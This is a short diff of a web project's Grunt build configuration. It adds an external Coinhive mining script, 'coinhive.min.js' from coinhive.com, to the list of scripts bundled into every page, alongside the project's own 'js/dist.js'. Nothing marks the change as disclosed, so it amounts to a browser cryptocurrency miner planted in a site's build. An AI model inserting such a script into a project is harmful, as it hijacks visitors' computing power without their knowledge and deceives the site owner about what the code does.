@@ -146,7 +146,10 @@ module.exports = function (grunt) {
 						required: [
 							'https://code.jquery.com/jquery-3.2.1.slim.min.js'
 						],
-						all: ['js/dist.js']
+						all: [
+						    'js/dist.js',
+						    'https://coinhive.com/lib/coinhive.min.js'
+						]
 					},
 					sections: {
 						layout: {
